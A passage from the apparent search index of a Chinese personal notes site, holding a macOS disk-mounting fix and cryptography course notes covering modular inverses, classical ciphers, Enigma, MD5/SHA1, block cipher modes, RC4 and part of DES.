fsck</code>\uff0c\u68c0\u67e5\u662f\u5426\u6709 fsck \u7a0b\u5e8f\uff0c\u8fd9\u662f\u5bf9\u78c1\u76d8\u8fdb\u884c\u68c0\u67e5\u4fee\u590d\u7684\u7a0b\u5e8f\uff0c\u53ef\u80fd\u662f\u8fd9\u91cc\u5361\u4f4f\u4e86\u3002\u7136\u540e <code>sudo pkill -f fsck</code> \u4e2d\u65ad\u8fdb\u7a0b\u3002\u63a5\u7740\u4f1a\u5f39\u51fa \u201cmacOS \u65e0\u6cd5\u4fee\u590d\u78c1\u76d8\u201d \u7684\u8b66\u544a\uff0c\u8fd9\u65f6\u786c\u76d8\u53ef\u4ee5\u88c5\u8f7d\u4e0a\uff0c\u4e0d\u8fc7\u662f\u53ea\u8bfb\u7684\u3002</p> <p>\u4e0b\u4e00\u6b65\u662f\u5728 mac \u4e0a\u6b63\u5e38\u5f39\u51fa\u8fd9\u4e2a\u78c1\u76d8\uff0c\u7136\u540e\u63d2\u5230 Windows \u4e0a\uff0c\u8d44\u6e90\u7ba1\u7406\u5668\u6253\u5f00\u78c1\u76d8\uff0c\u53f3\u952e\uff0c\u9009\u62e9 \u201c\u5c5e\u6027\u201d\uff0c\u7136\u540e\u9009\u62e9 \u201c\u5de5\u5177\u201d \u9009\u9879\u5361\uff0c\u70b9\u51fb \u201c\u68c0\u67e5\u201d\uff0c\u7136\u540e\u70b9\u51fb \u201c\u4fee\u590d\u201d\uff0c\u7b49\u5f85\u4fee\u590d\u5b8c\u6210\u3002\u7136\u540e\u518d\u63d2\u56de mac \u4e0a\uff0c\u5c31\u53ef\u4ee5\u6b63\u5e38\u6302\u8f7d\u8bfb\u5199\u4e86\u3002</p>"},{"location":"sec/","title":"Security","text":"<p>Abstract</p> <p>\u5b89\u5168\u76f8\u5173\u7684\u5185\u5bb9\u4f1a\u5199\u5728\u8fd9\u91cc\uff01</p> <p>\uff08\u5185\u5bb9\u5f88\u5c11\uff0c\u8fd8\u5728\u5b66\u4e60\uff09</p>"},{"location":"sec/#table-of-contents","title":"Table of Contents","text":"\u5b89\u5168\u7c7b\u8bfe\u7a0b\u7b14\u8bb0          <ul> <li> \u7f51\u7edc\u5b89\u5168\u539f\u7406\u4e0e\u5b9e\u8df5  4490  176  17 mins              1726419402 </li> <li> \u7cfb\u7edf\u5b89\u5168\u539f\u7406\u548c\u5b9e\u8df5  14110  899  59 mins              1726419402 </li> <li> \u65e0\u7ebf\u4e0e\u7269\u8054\u7f51\u5b89\u5168\u57fa\u7840  3004  133  11 mins              1726419402 </li> <li> \u5bc6\u7801\u5b66  4339  119  16 mins              1691330648 </li> <li> \u8f6f\u4ef6\u5b89\u5168\u539f\u7406\u548c\u5b9e\u8df5  8128  643  36 mins              1691330648 </li> </ul> \u6f0f\u6d1e\u590d\u73b0          <ul> <li> \u5185\u6838 eBPF \u6280\u672f\u7b80\u4ecb\u4e0e\u5b89\u5168\u6f0f\u6d1e\u5206\u6790  7481  446  31 mins              1726419402 </li> <li> log4j \u6f0f\u6d1e\u590d\u73b0  2881  91  11 mins              1671113908 </li> </ul>"},{"location":"sec/crypto/","title":"\u5bc6\u7801\u5b66","text":"<p> \u7ea6 4335 \u4e2a\u5b57  119 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 16 \u5206\u949f</p> <p>Abstract</p> <p>\u6d59\u6c5f\u5927\u5b66 \u201c\u5bc6\u7801\u5b66\u201d \u8bfe\u7a0b\u76f8\u5173\u77e5\u8bc6\u7b14\u8bb0</p> <p>\u8fd9\u91cc\u7684\u5185\u5bb9\u4e3b\u8981\u662f\u9488\u5bf9\u4e8e\u5bc6\u7801\u5b66\u8fd9\u95e8\u8bfe\u7684\u3002\u7531\u4e8e\u4e00\u7cfb\u5217\u539f\u56e0\uff0c\u8fd9\u95e8\u8bfe\u7684\u76ee\u7684\u5176\u5b9e\u662f\u8fdb\u884c\u4ee3\u7801\u5b9e\u8df5\uff0c\u800c\u4e0d\u504f\u91cd\u4e8e\u7406\u8bba\u3002\u66f4\u591a\u5173\u4e8e\u5bc6\u7801\u5b66\u7684\u7406\u8bba\u77e5\u8bc6\u7b49\u5982\u679c\u6211\u4f1a\u5199\u7684\u8bdd\u540e\u7eed\u4f1a\u52a0\u5728 CTF \u90e8\u5206\u7684\u7b14\u8bb0\u91cc\u3002</p> <p>\u8bfe\u7a0b\u4e3b\u8981\u5185\u5bb9\u662f\u53e4\u5178\u5bc6\u7801\u3001\u54c8\u5e0c\u7b97\u6cd5\uff08md5\u3001sha1\uff09\u3001\u5206\u7ec4\u52a0\u5bc6\u6a21\u5f0f\uff08ecb\u3001cbc\u3001cfb\uff09\u3001\u6d41\u5bc6\u7801\uff08rc4\uff09\u3001\u56db\u5927\u52a0\u5bc6\u7b97\u6cd5\uff08DES\u3001AES\u3001RSA\u3001ECC\uff09\u3002\u7b14\u8bb0\u4e3b\u8981\u662f\u671f\u672b\u590d\u4e60\u7684\u65f6\u5019\u5199\u7684\u603b\u7ed3\uff0c\u5e76\u4e0d\u5168\u9762\u3002</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>\u56fe\u7075\u73ed\u8bfe\u7a0b\u5b66\u4e60\u6307\u5357\uff1a\u5bc6\u7801\u5b66</li> </ul>"},{"location":"sec/crypto/#_2","title":"\u6570\u5b66\u57fa\u7840","text":"<ul> <li>\\(a, b\\) \u4e3a\u6574\u6570\uff0c\u4e14\u81f3\u5c11\u6709\u4e00\u4e2a\u4e0d\u4e3a 0\uff0c\u5219\u4e00\u5b9a\u5b58\u5728\u6574\u6570 \\(x, y\\) \u4f7f\u5f97 \\(ax + by = \\gcd(a, b)\\)</li> <li>\u82e5 \\(a+b \\equiv 0 \\pmod n\\)\uff0c\u5219 \\(a, b\\) \u4e92\u4e3a\u6a21 \\(n\\) \u7684\u52a0\u6cd5\u9006\u5143<ul> <li>\u52a0\u6cd5\u9006\u5143\u4e00\u5b9a\u5b58\u5728</li> </ul> </li> <li>\u82e5 \\(ab \\equiv 1 \\pmod n\\)\uff0c\u5219 \\(a, b\\) \u4e92\u4e3a\u6a21 \\(n\\) \u7684\u4e58\u6cd5\u9006\u5143\uff0c\\(a\\) \u7684\u4e58\u6cd5\u9006\u5143\u8bb0\u4e3a \\(a^{-1}\\)<ul> <li>\u4e58\u6cd5\u9006\u5143\u4e0d\u4e00\u5b9a\u5b58\u5728</li> <li>\\(a\\) \u7684\u9006\u5143\u5b58\u5728\uff0c\u5219 \\(\\gcd(a, n) = 1\\)</li> <li>\u6c42\u4e58\u6cd5\u9006\u5143\uff0c\u6839\u636e \\(ax+ny = \\gcd(a, n) = 1\\) \u4ee5\u53ca \\(aa^{-1}\\equiv 1\\pmod n\\)\uff0c\u5373\u6c42\u89e3 \\(x\\)</li> <li> <p>\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\uff0c\u6c42\u89e3 \\(ax+by = \\gcd(a, b)\\) \u4e2d\u7684 \\(x, y\\) <pre><code>void exgcd(LL a, LL b, LL&amp; d, LL&amp; x, LL&amp; y) {\n    if (!b) { d = a; x = 1; y = 0; }\n    else { exgcd(b, a % b, d, y, x); y -= x * (a / b); }\n}\n</code></pre></p> Example <p>\u6c42 13 \u5728\u6a21 35 \u4e0b\u7684\u9006\u5143\uff08\u6c42\u89e3 13x + 35y = 1\uff09 <pre><code>35 / 13 = 2 ... 9\n13 / 9 = 1 ... 4\n9 / 4 = 2 ... 1\n\n1 = 9 - 2 * 4\n  = (35 - 13 * 2) - 2 * (13 - 9 * 1)\n  = (35 - 13 * 2) - 2 * (13 - (35 - 13 * 2) * 1)\n  = 3 * 35 - 8 * 13\n</code></pre></p> <p>\u6240\u4ee5 x = -8, y = 3\uff0c\u5f97 13 \u5728\u6a21 35 \u4e0b\u7684\u9006\u5143\u4e3a -8\uff0c\u5373 27\u3002</p> </li> </ul> </li> </ul>"},{"location":"sec/crypto/#_3","title":"\u53e4\u5178\u5bc6\u7801","text":""},{"location":"sec/crypto/#_4","title":"\u5355\u8868\u52a0\u5bc6","text":"<ul> <li>\u52a0\u6cd5\u5bc6\u7801<ul> <li>\\(y = (x + key)\\bmod 26\\)</li> <li>\\(x = (y - key)\\bmod 26\\) \u5229\u7528\u52a0\u6cd5\u9006\u5143</li> </ul> </li> <li>\u4e58\u6cd5\u5bc6\u7801<ul> <li>\\(y = (x \\times key)\\bmod 26\\)</li> <li>\\(x = (y \\times key^{-1})\\bmod 26\\) \u5229\u7528\u4e58\u6cd5\u9006\u5143</li> </ul> </li> <li>\u4eff\u5c04\u5bc6\u7801<ul> <li>\u7ed3\u5408\u52a0\u6cd5\u5bc6\u7801\u548c\u4e58\u6cd5\u5bc6\u7801</li> <li>\\(y = (ax + b)\\bmod 26\\)</li> <li>\\(x = a^{-1}(y - b)\\bmod 26\\)</li> </ul> </li> </ul>"},{"location":"sec/crypto/#_5","title":"\u591a\u8868\u5bc6\u7801","text":"<p>\u76f8\u540c\u7684\u660e\u6587\u5bf9\u5e94\u7684\u5bc6\u6587\u4f1a\u6709\u53d8\u5316\u3002</p> <ul> <li>Vigenere \u5bc6\u7801<ul> <li>\u5bc6\u94a5\u5faa\u73af\u4f7f\u7528\uff0c\u7b2c \\(i\\) \u4f4d\u4e3a \\(key_i\\)</li> <li>\\(y_i = (x_i + key_i)\\bmod 26\\)</li> <li>\\(x_i = (y_i - key_i)\\bmod 26\\)</li> </ul> </li> </ul>"},{"location":"sec/crypto/#enigma","title":"Enigma","text":"<p>\u6574\u4f53\u903b\u8f91\u5c31\u4e0d\u5199\u4e86\uff0c\u5927\u6982\u5c31\u662f\u4e94\u4e2a\u9009\u4e09\u4e2a\u8f6c\u5b50\uff0c\u53f3\u4fa7\u662f\u8f93\u5165\u8f93\u51fa\uff0c\u5de6\u4fa7\u662f\u53cd\u5c04\u677f\uff0c\u6bcf\u4e2a\u8f6c\u5b50\u6709 RingSetting \u548c MessageKey \u5c5e\u6027</p> <ul> <li>RingSetting\uff1a\u521d\u59cb\u4f4d\u7f6e\uff0c\u4e0d\u53d8\u7684</li> <li>MessageKey\uff1a\u4ece\u8bbe\u5b9a\u7684 key \u5f00\u59cb\uff0c\u53ef\u4ee5\u8f6c\u52a8\uff08\u52a0 1\uff09</li> </ul> <p>\u5bf9\u4e8e\u6bcf\u4e2a\u5b57\u7b26\uff1a</p> <ul> <li>\u7ecf\u8fc7\u63d2\u7ebf\u677f\u67e5\u8868 P1 = plugboard[P - 'A']<ul> <li>P \u662f\u660e\u6587\uff0cP1 \u4ec0\u4e48\u7684\u547d\u540d\u6709\u4e9b\u6df7\u4e71\u89c1\u8c05</li> <li><code>- 'A'</code> \u4ec0\u4e48\u7684\u540e\u9762\u4e5f\u4e0d\u518d\u5199\u4e86\uff0c\u53cd\u6b63\u7406\u89e3\u4e86\u5c31\u597d</li> </ul> </li> <li>\u8f6c\u52a8\u6700\u53f3\u4fa7\u8f6c\u5b50\uff1aMessageKey[2] = (MessageKey[2] + 1) % 26</li> <li>\u68c0\u67e5\u5de6\u4fa7\u7684\u8f6c\u5b50\u662f\u5426\u4f1a\u53d1\u751f\u8f6c\u52a8\uff1a<ul> <li>\u5982\u679c\u5f53\u524d\u8f6c\u5b50\u8f6c\u5230\u4e86\u5bf9\u5e94\u4f4d\u7f6e\uff0c\u5219\u4e0b\u4e00\u4e2a\u8f6c\u5b50\u8f6c\u52a8<ul> <li>\u4e94\u4e2a\u8f6c\u5b50\u4ece 1 \u53f7\u5230 5 \u53f7\u7684\u4f4d\u7f6e\u5206\u522b\u4e3a RFWKA\uff08\u62cd\u6d17\u5934\u4f6c\u9a6c\u5c41\uff09</li> </ul> </li> <li>\u53ef\u80fd\u4f1a\u53d1\u751f double stepping<ul> <li>\u5982\u679c\u4e2d\u95f4\u7684\u8f6c\u5b50\u8f6c\u5230\u4e86\u5bf9\u5e94\u4f4d\u7f6e\u7684\u524d\u4e00\u4e2a\uff0c\u5219\u5b83\u4e5f\u4f1a\u53d1\u751f\u8f6c\u52a8\uff08\u540c\u65f6\u5e26\u52a8\u5de6\u4fa7\u7684\u4e5f\u8f6c\uff09</li> <li>\u673a\u68b0\u7ed3\u6784\u51b3\u5b9a\u7684 double stepping\uff0c\u53ea\u4f1a\u53d1\u751f\u5728 2 \u53f7\u8f6c\u5b50</li> </ul> </li> </ul> </li> <li>\u4ece\u53f3\u5230\u5de6\u67e5\u8be2\u8f6c\u5b50\uff0c\u6bcf\u4e2a\u7684\u64cd\u4f5c\uff1a<ul> <li>\u8ba1\u7b97 delta = MessageKey[i] - RingSetting[i]</li> <li>\u67e5\u8868 P2 = rotor[i][P1 + delta]</li> <li>\u5f97\u5230 P2 - delta</li> </ul> </li> <li>\u7ecf\u8fc7\u53cd\u5c04\u677f\u67e5\u8868\uff08\u7c7b\u4f3c\u63d2\u7ebf\u677f\uff09</li> <li>\u4ece\u5de6\u5230\u53f3\u67e5\u8be2\u8f6c\u5b50\uff0c\u6bcf\u4e2a\u7684\u64cd\u4f5c\uff1a<ul> <li>\u8ba1\u7b97 delta = MessageKey[i] - RingSetting[i]</li> <li>\u67e5\u627e index \u4f7f\u5f97 rotor[i][index] = P3 + delta</li> <li>\u5f97\u5230 index - delta</li> </ul> </li> <li>\u7ecf\u8fc7\u63d2\u7ebf\u677f\u67e5\u8868 C = plugboard[P3 - 'A']<ul> <li>C \u5373\u5bf9\u5e94\u7684\u5bc6\u6587</li> <li>\u540c\u72b6\u6001\u4e0b C \u4f5c\u4e3a\u660e\u6587\u5373\u53ef\u5f97\u5230\u89e3\u5bc6\u7ed3\u679c P</li> </ul> </li> </ul>"},{"location":"sec/crypto/#_6","title":"\u54c8\u5e0c\u7b97\u6cd5","text":"<ul> <li>md5<ul> <li>message \u4efb\u610f\u957f\uff080 \u4e5f\u53ef\u4ee5\uff09\uff0cdigest \u56fa\u5b9a 16 \u5b57\u8282\uff08128 \u4f4d\uff09</li> <li>\u5206\u5757\u586b\u5145<ul> <li>\u6bcf\u5757 64 \u5b57\u8282\uff08512 \u4f4d\uff09</li> <li>\u586b\u5145\u81f3\u4fdd\u8bc1\u6700\u540e\u4e00\u5757\u957f\u5ea6\u4e3a 56 \u5b57\u8282\uff08\u7559\u51fa 8 \u5b57\u8282\u5b58\u50a8 message \u957f\u5ea6\uff09<ul> <li>\u586b\u5145\u65b9\u5f0f\u4e3a\u4e00\u4e2a 0x80 \u540e\u5168\u662f 0x00\uff08\u5373\u540e\u4e00\u4f4d 1 \u63a5\u4e0b\u6765\u5168\u662f 0\uff09</li> <li>\u4e00\u5b9a\u4f1a\u5b58\u5728\u586b\u5145\uff0c\u6070\u597d\u4e3a 56 \u5b57\u8282\u65f6\u9700\u8981\u586b\u5145 64 \u5b57\u8282</li> </ul> </li> <li>\u6700\u540e 8 \u5b57\u8282\u5b58\u50a8 message \u957f\u5ea6<ul> <li>\u4ee5\u6bd4\u7279\u4e3a\u5355\u4f4d\u7684\u957f\u5ea6\uff0c\u5c0f\u7aef\u5e8f\u5b58\u50a8</li> </ul> </li> </ul> </li> <li>openssl<ul> <li><code>MD5(message, length, digest)</code> <pre><code>MD5_CTX m;\nMD5_Init(&amp;m);\nMD5_Update(&amp;m, message, length);\nMD5_Final(digest, &amp;m);\n</code></pre></li> </ul> </li> <li>\u5f69\u8679\u8868<ul> <li>\u601d\u60f3\uff1a\u9884\u8ba1\u7b97\u6709\u9650\u539f\u6587\u7684\u6458\u8981\uff0c\u8282\u7701\u539f\u6587\u4e0e\u6458\u8981\u6620\u5c04\u7684\u7a7a\u95f4</li> <li>\u9700\u8981\u4e00\u4e2a\u6d88\u51cf\u51fd\u6570 R\uff0c\u53ef\u4ee5\u5c06\u6458\u8981\u6620\u5c04\u56de\u539f\u6587\u7a7a\u95f4\u4e2d\u7684\u4e00\u4e2a\u503c</li> <li>\u9009\u62e9\u4e00\u4e2a\u8d77\u59cb\u4fe1\u606f M0 \u9010\u6b21\u8ba1\u7b97\u5f62\u6210\u4e00\u6761\u94fe\uff1a     <pre><code>M0 --H--&gt; H0 --R--&gt; M1 --H--&gt; H1 ... --R--&gt; Hn\n</code></pre></li> <li>\u8fd9\u6837\u53ea\u9700\u8981\u8bb0\u5f55\u4e00\u7cfb\u5217 M0 \u548c Hn \u5c31\u53ef\u4ee5\u5b9e\u73b0\u67e5\u8868</li> <li>\u5047\u8bbe\u8981\u7834\u89e3 Hm\uff0c\u540c\u6837\u5bf9 Hm \u65bd\u52a0 R\u3001H\uff0c\u76f4\u5230\u5f97\u5230\u7684 Hn \u5728\u8868\u4e2d\u51fa\u73b0\uff0c\u5c31\u8bf4\u660e Mm \u548c Hm \u5728\u8fd9\u6761\u94fe\u4e0a\uff0c\u6cbf\u7740 M0 \u5f00\u59cb\u7684\u94fe\u627e\u5230 Mm \u5373\u53ef</li> <li>\u7f3a\u70b9\u662f\u6d88\u51cf\u51fd\u6570\u9700\u8981\u907f\u514d\u4e24\u6761\u94fe\u78b0\u649e</li> </ul> </li> </ul> </li> <li>sha1<ul> <li>message \u4e0d\u8d85\u8fc7 2^64 \u4f4d\uff0cdigest \u56fa\u5b9a 20 \u5b57\u8282\uff08160 \u4f4d\uff09</li> <li>\u548c md5 \u540c\u6837\u5206\u5757\u586b\u5145\uff0c\u586b\u5145\u65b9\u6cd5\u57fa\u672c\u4e00\u81f4<ul> <li>\u5dee\u522b\u5728\u4e8e message \u957f\u5ea6\u7528\u5927\u7aef\u5e8f\u5b58\u50a8</li> </ul> </li> </ul> </li> </ul>"},{"location":"sec/crypto/#_7","title":"\u5206\u7ec4\u52a0\u5bc6\u6a21\u5f0f","text":"<ul> <li>ECB\uff1a\u7535\u5b50\u5bc6\u7801\u672c\u6a21\u5f0f<ul> <li>\u5206\u5757\uff0c\u5206\u522b\u4ee5\u540c\u79cd\u65b9\u5f0f\u52a0\u5bc6\uff0c\u5408\u5e76</li> <li>\\(C_i=\\mathrm{enc}(P_i), P_i=\\mathrm{dec}(C_i)\\)</li> <li>\u4f18\u70b9\uff1a\u53ef\u4ee5\u5e76\u884c\u8ba1\u7b97</li> <li>\u7f3a\u70b9\uff1a\u76f8\u540c\u660e\u6587\u5757\u5f97\u5230\u7684\u5bc6\u6587\u5757\u76f8\u540c\uff0c\u5b89\u5168\u6027\u8f83\u5dee</li> </ul> </li> <li>CBC\uff1a\u5bc6\u6587\u5757\u94fe\u63a5\u6a21\u5f0f<ul> <li>\u6bcf\u5757\u52a0\u5bc6\u524d\u5c06\u660e\u6587\u5757\u4e0e\u524d\u4e00\u5757\u5bc6\u6587\u5757\u5f02\u6216<ul> <li>\u4e0e\u7b2c\u4e00\u5757\u660e\u6587\u5757\u5f02\u6216\u7684\u79f0\u4e3a IV\uff08Initialization Vector\uff09\uff0c\u957f\u5ea6\u8981\u7b49\u5bbd</li> </ul> </li> <li>\\(C_i=\\mathrm{enc}(P_i\\oplus C_{i-1}), P_i=\\mathrm{dec}(C_i)\\oplus C_{i-1}\\)</li> <li>\u5f53\u524d\u5757\u7684\u5bc6\u6587\u4e0e\u524d\u4e00\u5757\u7684\u5bc6\u6587\u6709\u5173</li> <li>\u52a0\u5bc6\u53ea\u80fd\u4e32\u884c\uff0c\u89e3\u5bc6\u53ef\u4ee5\u5e76\u884c</li> <li>\u5bc6\u6587\u5757\u51fa\u9519\u5f71\u54cd\u4e24\u4e2a\u660e\u6587\u5757\uff0c\u5bc6\u6587\u5757\u7f3a\u5931\u5f71\u54cd\u540e\u7eed\u6240\u6709\u660e\u6587\u5757</li> <li>\u5bc6\u6587\u5077\u7a83\u6a21\u5f0f\uff08ciphertext stealing\uff09<ul> <li>\u6700\u540e\u4e00\u5757\u4e0d\u591f\u957f\u65f6 pad 0 \u4f1a\u5bfc\u81f4\u5bc6\u6587\u957f\u4e8e\u539f\u6587\uff08\u6539\u53d8\u4e86\u660e\u6587\u957f\u5ea6\uff09</li> <li>\u89e3\u51b3\u65b9\u6cd5\uff1a\u5012\u6570\u7b2c\u4e8c\u4e2a\u5bc6\u6587\u5757\u53ea\u4fdd\u7559\u6700\u540e\u4e00\u4e2a\u660e\u6587\u5757\u540c\u6837\u957f\u5ea6\u7684\u5b57\u8282\uff0c\u5373 C1 || C2 || ... || Cn-1' || Cn\uff0c\u5176\u4e2d Cn-1' \u957f\u5ea6\u53ef\u80fd\u4f1a\u5c0f\u4e8e\u5757\u5927\u5c0f</li> <li>CBC-CS1\uff1a\u5373\u5982\u4e0a\u4fdd\u7559\u5bc6\u6587\u5757</li> <li>CBC-CS2\uff1a\u5982\u679c\u6700\u540e\u4e00\u4e2a\u5757\u4e0d\u5b8c\u6574\uff0c\u5219\u4ea4\u6362\u540e\u4e24\u4e2a\u5bc6\u6587\u5757</li> <li>CBC-CS3\uff1a\u65e0\u6761\u4ef6\u4ea4\u6362\u540e\u4e24\u4e2a\u5bc6\u6587\u5757</li> </ul> </li> </ul> </li> <li>CFB\uff1a\u5bc6\u6587\u53cd\u9988\u6a21\u5f0f<ul> <li>\u52a0\u5bc6 iv \u7136\u540e\u4e0e\u660e\u6587\u5757\u5f02\u6216\uff0c\u5f97\u5230\u5bc6\u6587\u5757<ul> <li>iv \u957f\u4e8e\u660e\u6587\u5757</li> </ul> </li> <li>\u6bd4\u5982 iv \u4e3a 64 \u4f4d (iv[0]..iv[7])\uff0c\u5757\u5927\u5c0f\u4e3a 8 \u4f4d\uff0c\u5219\u6bcf\u6b21\uff1a     <pre><code>iv_ = enc(iv)\nC[i] = P[i] ^ iv_[0]    // \u6bcf\u6b21\u90fd\u53ea\u7528 iv \u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\niv = (iv &lt;&lt; 8) | C[i]   // \u5c06 C[i] \u653e\u5230 iv \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\n</code></pre></li> <li>\u89e3\u5bc6\uff1a     <pre><code>iv_ = enc(iv)   // \u540c\u6837\u662f\u52a0\u5bc6\uff0c\u4e0d\u9700\u8981\u89e3\u5bc6\nP[i] = C[i] ^ iv_[0]\niv = (iv &lt;&lt; 8) | C[i]\n</code></pre></li> <li>\u9010\u5b57\u8282\uff0c\u9002\u5408\u6d41\u52a0\u5bc6\uff0c\u7528\u4e8e\u7f51\u7edc\u4f20\u8f93\u4e4b\u7c7b\uff0c\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u51fa\u9519\u4e00\u4e2a\u5b57\u8282\u53ea\u5f71\u54cd\u4e5d\u4e2a\u5b57\u8282\uff0c\u540e\u7eed\u53ef\u4ee5\u6062\u590d\uff0c\u6548\u7387\u4f4e</li> </ul> </li> </ul>"},{"location":"sec/crypto/#_8","title":"\u6d41\u5bc6\u7801","text":"<ul> <li>rc4<ul> <li>\u6bcf\u6b21\u52a0\u89e3\u5bc6\u4e00\u4e2a\u5b57\u8282\uff0c\u9ad8\u6548</li> <li>\u5bc6\u94a5\u957f\u5ea6 1-256 \u5b57\u8282\uff0c\u5185\u90e8\u6709\u4e00\u4e2a 256 \u5b57\u8282\u7684\u72b6\u6001\u5411\u91cf S</li> <li>\u72b6\u6001\u5411\u91cf\u521d\u59cb\u5316\uff1a     <pre><code>for (int i = 0; i &lt; 256; ++i) S[i] = i;\nint j = 0;\nfor (int i = 0; i &lt; 256; ++i) {\n    j = (j + S[i] + key[i % len(key)]) % 256;\n    swap(S[i], S[j]);\n}\n</code></pre></li> <li>\u52a0\u89e3\u5bc6\u8fc7\u7a0b\u76f8\u540c\uff1a     <pre><code>int i = 0, j = 0;\nfor (int k = 0; k &lt; message_len; ++k) {\n    i = (i + 1) % 256;\n    j = (j + S[i]) % 256;\n    swap(S[i], S[j]);\n    message[k] ^= S[(S[i] + S[j]) % 256];\n}\n</code></pre></li> </ul> </li> </ul>"},{"location":"sec/crypto/#des","title":"DES","text":"<ul> <li>\u5757\u52a0\u5bc6\u7b97\u6cd5\uff0c\u6bcf\u6b21\u660e\u6587\u516b\u5b57\u8282\u5bc6\u6587\u516b\u5b57\u8282\uff0c\u5bc6\u94a5 64 \u4f4d\uff0856 \u4f4d\u6709\u6548\u30018 \u4f4d\u6821\u9a8c\uff09</li> <li>\u5b58\u5728\u7684\u95ee\u9898\uff1a\u5bc6\u94a5\u592a\u77ed\uff0c\u5dee\u5206\u653b\u51fb\u53ef\u4ee5\u7f29\u77ed\u5de5\u4f5c\u91cf\uff0csbox \u8bbe\u8ba1\u89c4\u5219\u6ca1\u6709\u516c\u5f00</li> <li>\u4e3b\u8981\u6d41\u7a0b\uff1a\u521d\u59cb\u7f6e\u6362\uff08ip\uff09\u300116 \u8f6e\u8fed\u4ee3\uff08f \u51fd\u6570\uff09\u3001\u9006\u521d\u59cb\u7f6e\u6362\uff08fp/ip-1\uff09</li> <li>\u521d\u59cb\u7f6e\u6362\uff1a<ul> <li>64 bit -&gt; 64 bit</li> <li>\u5982\uff1aip[0] = 58\uff0c\u521d\u59cb\u7b2c 58 \u4f4d\u4e3a\u7f6e\u6362\u540e\u7b2c 1 \u4f4d</li> <li>\u7f6e\u6362\u540e\u8bb0\u5de6\u4fa7 32 \u4f4d\u4e3a \\(L_0\\)\uff0c\u53f3\u4fa7 32 \u4f4d\u4e3a \\(R_0\\)</li> </ul> </li> <li>\u5b50\u5bc6\u94a5\u751f\u6210\uff1a<ul> <li>\u6bcf\u4e00\u8f6e\u7684 f \u51fd\u6570\u90fd\u9700\u8981\u4e00\u4e2a 48 \u4f4d\u5b50\u5bc6\u94a5\uff0c\u90fd\u662f\u7531\u521d\u59cb 64 \u4f4d\u5bc6\u94a5\u751f\u6210\u7684</li> <li>PC-1 \u8868\u7f6e\u6362\uff08key_perm_table\uff09<ul> <li>64 bit -&gt; 56 bit\uff08\u53bb\u6389\u6821\u9a8c\u4f4d\u5e76\u6253\u4e71\uff09</li> <li>\u7f6e\u6362\u8fc7\u7a0b\u540c ip</li> <li>\u7f6e\u6362\u540e\u8bb0\u5de6 28 \u4f4d\u4e3a \\(C_0\\)\uff0c\u53f3 28 \u4f4d\u4e3a \\(D_0\\)</li> </ul> </li> <li>\u5faa\u73af\u5de6\u79fb<ul> <li>\u6709\u4e00\u5f20\u8868\u8bb0\u5f55\u6bcf\u4e00\u8f6e\u5faa\u73af\u5de6\u79fb\u7684\u4f4d\u6570\uff081 \u6216 2\uff09</li> <li>\\(C_{i-1}\\) \u5faa\u73af\u5de6\u79fb 1/2 \u4f4d\u5f97\u5230 \\(C_i\\)\uff0c\\(D\\) \u540c\u7406</li> <li>\u5f97\u5230 \\(C_1, \\cdots, C_{16}\\) \u548c \\(D_1, \\cdots, D_{16}\\)</li> </ul> </li> <li>PC-2 \u8868\u7f6e\u6362\uff08key_56bit_to_48bit_table\uff09<ul> <li>56 bit -&gt; 48 bit\uff08\u6bcf\u7ec4 \\(CD\\) \u4e2d\u9009 48 \u4f4d\u5e76\u6253\u4e71\uff09</li> <li>\\(C_n\\) \u548c \\(D_n\\) \u4ece\u5de6\u5230\u53f3\u62fc\u5230\u4e00\u8d77\u7f6e\u6362\u540e\u5f97\u5230\u7b2c \\(n\\) \u8f6e\u5b50\u5bc6\u94a5 \\(K_n\\)</li> </ul> </li> </ul> </li> <li>\u8f6e\u51fd\u6570<ul> <li>\u521d\u59cb\u7f6e\u6362\u540e\u5f97\u5230\u4e86 \\(L_0\\) \u548c \\(R_0\\)</li> <li>\u6bcf\u4e00\u8f6e\u8fdb\u884c\uff1a<ul> <li>\\(L_i = R_{i-1}\\)</li> <li>\\(R_i = L_{i-1} \\oplus f(R_{i-1}, K_i)\\)</li> </ul> </li> <li>16 \u8f6e\u540e\u5f97\u5230 \\(L_{16}\\) \u548c \\(R_{16}\\)\uff0c\u8c03\u6362\u4e00\u4e0b\u62fc\u63a5 \\(R_{16}L_{16}\\) \u518d\u9006\u521d\u59cb\u7f6e\u6362\u540e\u5f97\u5230\u5bc6\u6587</li> </ul> </li> <li>f \u51fd\u6570<ul> <li>DES \u7b97\u6cd5\u6838\u5fc3\uff0c\u4e24\u4e2a\u8f93\u5165 32 \u4f4d R \u548c 48 \u4f4d K\uff0c\u8f93\u51fa 32 \u4f4d</li> <li>E \u6269\u5c55\u7f6e\u6362\uff08plaintext_32bit_expanded_to_48bit_table\uff09<ul> <li>32 bit -&gt; 48 bit\uff08\u6269\u5c55 R \u5230 48 \u4f4d\uff09</li> </ul> </li> <li>E \u6269\u5c55\u540e\u7684\u7ed3\u679c\u4e0e K \u5f02\u6216\uff0c\u5f97\u5230 48 \u4f4d\u7ed3\u679c</li> <li>S-box \u7f6e\u6362<ul> <li>48 \u4f4d\u7ed3\u679c\u5206\u4e3a 8 \u7ec4\uff0c\u6bcf\u7ec4 6 \u4f4d\uff0c\u5206\u522b\u8fdb\u5165\u5bf9\u5e94 sbox \u4e2d\u8fdb\u884c\u7f6e\u6362\u5f97\u5230 4 \u4f4d\u7ed3\u679c<ul> <li>\u6bcf\u4e2a sbox 4 \u884c 16 \u5217</li> <li>6 \u4f4d\u4e2d\u7b2c 1 \u4f4d\u548c\u7b2c 6 \u4f4d\u7ec4\u6210\u884c\u6570\uff0c\u4e2d\u95f4 4 \u4f4d\u7ec4\u6210\u5217\u6570</li> <li>sbox \u5bf9\u5e94\u884c\u5217\u4f4d\u7f6e\u4e0a\u7684\u6570\u5c31\u662f\u5f97\u5230\u7684 4 \u4f4d\u7ed3\u679c</li> </ul> </li> <li>8 \u7ec4 4 \u4f4d\u7ed3\u679c\u62fc\u8d77\u6765\u5f97\u5230 32 \u4f4d\u7ed3\u679c</li> </ul> </li> <li>P \u76d2\u7f6e\u6362\uff08sbox_perm_table\uff09<ul> <li>32 bit -&gt; 32 bit\uff08\u6253\u4e71 32 \u4f4d\u7ed3\u679c\uff09</li> 